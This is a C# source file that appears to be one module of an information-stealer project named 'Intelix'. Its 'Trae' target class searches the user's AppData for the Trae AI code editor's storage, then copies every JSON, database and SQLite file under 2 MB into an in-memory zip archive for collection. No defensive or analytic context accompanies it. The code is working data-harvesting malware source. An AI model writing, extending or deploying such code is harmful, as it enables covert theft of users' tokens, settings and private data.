using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Trae : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] paths = {
                Path.Combine(appdata, "Trae", "User", "globalStorage"),
                Path.Combine(appdata, "Trae", "User")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                var entry = new Counter.CounterApplications { Name = "Trae" };
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".db" && ext != ".sqlite") continue;
                    if (new FileInfo(file).Length > 2 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Trae\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
                if (entry.Files.Count > 0) { counter.AI.Add(entry); break; }
            }
        }
    }
}
